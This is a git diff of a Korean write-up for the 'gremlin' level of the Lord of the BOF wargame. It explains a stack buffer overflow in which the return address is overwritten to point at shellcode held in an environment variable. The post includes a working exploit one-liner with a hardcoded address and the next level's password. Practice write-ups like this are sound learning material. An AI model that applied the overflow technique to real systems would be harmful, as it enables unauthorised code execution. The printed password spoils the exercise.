@@ -5,7 +5,8 @@ tags: [stack buffer overflow]
 ---
 
 ## gremlin
----
+<hr style="border-top: 1px solid;"> 
+
 ```c
 /*
         The Lord of the BOF : The Fellowship of the BOF
@@ -53,18 +54,30 @@ int main(int argc, char *argv[])
 0x8048479 <main+73>:    leave
 0x804847a <main+74>:    ret
 ```
+
 <br>
+<hr style="border: 2px solid;"> 
 <br>
 
 ## Solution
----
-버퍼의 크기가 16인데 쉘코드 길이는 25byte, 41byte 등으로 버퍼안에 쉘코드를 넣어줄 수가 없음.  
-그래서 환경변수를 이용하여 문제를 해결해야 함.  
+<hr style="border-top: 1px solid;"> 
 
-환경변수를 이용하면 변수의 주소를 리턴주소로 설정하면 되므로 버퍼의 크기에 상관없이 쉘코드를 실행시킬 수 있다. [환경변수 설정 및 주소 구하기](https://pistolwest.github.io/linux/bof/environment-value/)
+버퍼의 크기가 16인데 쉘코드 길이는 25byte, 41byte 등으로 버퍼안에 쉘코드를 넣어줄 수가 없음. 이 때 환경변수를 이용해서 풀 수 있음.
 
-환경변수 주소 ex)0xbffffc34 를 리턴 주소로 해주면 끝임. 
-```
+**환경 변수에서 중요한 부분은 환경 변수가 스택에 위치한다는 점과 셸에서 값을 설정할 수 있다는 점이다.**  
+
+환경변수를 이용하면 변수의 주소를 리턴주소로 설정하면 되므로 버퍼의 크기에 상관없이 쉘코드를 실행시킬 수 있다. 
+
+Link : <a href="https://ind2x.github.io/posts/environment_value/" target="_blank">환경변수 설정 및 주소 구하기</a>
+
+<br>
+
+환경변수 주소 ```ex)0xbffffc34``` 를 리턴 주소로 해주면 끝임. 
+```console
 ./cobolt `python -c 'print "\x90"*20+"\x34\xfc\xff\xbf"'`
-``` 
 my-pass : hacking exposed
+```
+
+<br>
+<hr style="border: 2px solid;"> 
+<br>
